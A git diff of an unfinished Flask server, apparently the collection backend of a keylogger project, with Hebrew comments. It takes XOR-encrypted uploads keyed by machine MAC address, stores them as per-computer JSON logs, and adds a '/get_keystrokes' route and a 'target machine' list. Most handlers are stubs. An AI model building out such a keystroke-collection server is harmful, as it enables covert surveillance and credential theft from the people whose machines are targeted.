@@ -1,7 +1,25 @@
+from flask import Flask,jsonify,request
+from encryptor import Encryptor
 import json
 import os
-from flask import Flask,jsonify,request
 import time
+
+class App:
+
+    def __init__(self):
+        self.path = "data\\"
+        self.counter = 0
+        self.manager = {}
+
+    def add_computer(self,computer_name):
+        pass
+
+    def get_data(self):
+        pass
+
+    def get_computer_list(self):
+        pass
+
 
 app = Flask(__name__)
 
@@ -13,6 +31,8 @@ def home():
 def upload():
 
     data = request.get_json()
+    # process = SpecialKeys()
+    decryptor = Encryptor()
 
     #ניהול שגיאות
     if error_manager(data):
@@ -22,17 +42,22 @@ def upload():
     folder_name = data["mac_name"].replace(":","_")
     new_data = data["data"]
 
-    #להחזיר את ההצפנה לנתונים המקוריים
+    #הוספת הכתבות למחלקה
+    manager.add_computer(folder_name)
 
+
+    #להחזיר את ההצפנה לנתונים המקוריים
+    data["data"] = decryptor.decrypt_xor(new_data)
 
     #לעשות על הנתונים פרוסס
 
 
     #יצירת תיקיה למחשב הנתון
-    open_new_folder(folder_name)
+    folder_path = "data\\" + folder_name
+    open_new_folder(folder_path)
 
     #יצירת נתיב ליצירת קובץ
-    file_path = folder_name + '\\' + generate_json_file()
+    file_path = folder_path + '\\' + generate_json_file()
 
     #שליחת הנתונים הרלוונטים לקובץ
     save_data_in_DB(data,file_path)
@@ -53,16 +78,29 @@ def generate_json_file():
     return "log_" + time.strftime("%Y-%m-%d_%H_%M_%S") + ".json"
 
 def save_data_in_DB(data,file_path):
-    with open(file_path,'w') as file:
-        json.dump(data,file,indent=4)
+    with open(file_path,'w',encoding="utf-8") as file:
+        json.dump(data,file,indent=4,ensure_ascii=False)
 
+
+@app.route("/api/get_machine_list",methods=["GET"])
+def get_target_machine_list():
+    manager.get_computer_list()
+
+@app.route("/get_keystrokes",methods=["GET"])
 def get_data_from_DB():
-    pass
+    computer_name = request.args.get("computer")
+    #בדיקה האם שלח פרמטר מחשב
+
+    #בדיקה האם קיים כזה מחשב
+
+    #שליחת המידע הרלוונטי
+
 
 @app.route("/api/data",methods=['GET'])
 def get_data():
     pass
 
 if __name__ == '__main__':
+    manager = App()
     app.run(debug=True,port=5000)
 
